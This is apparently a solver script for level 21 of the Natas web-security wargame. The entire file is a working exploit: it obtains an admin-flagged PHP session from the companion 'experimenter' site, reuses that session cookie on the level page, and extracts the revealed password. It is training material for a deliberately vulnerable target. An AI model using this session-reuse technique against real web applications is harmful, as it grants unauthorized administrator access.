from config import password_length, base_url
from utils import get_level_url, get_request_object, store_secret_and_print_message

level_number = 21


def get_secret():
    req = get_request_object(level_number)
    result = req.post(f"http://natas21-experimenter.{base_url}", data={"admin": "1", "submit": "1"})
    cookie = result.cookies.get("PHPSESSID")
    result = req.get(get_level_url(level_number), cookies={"PHPSESSID": cookie})
    text = result.text
    search = "Password:"

    if search in text:
        start_index = text.find(search) + len(search) + 1
        return text[start_index: start_index + password_length]
    else:
        return ""


secret = get_secret()
store_secret_and_print_message(level_number, secret)
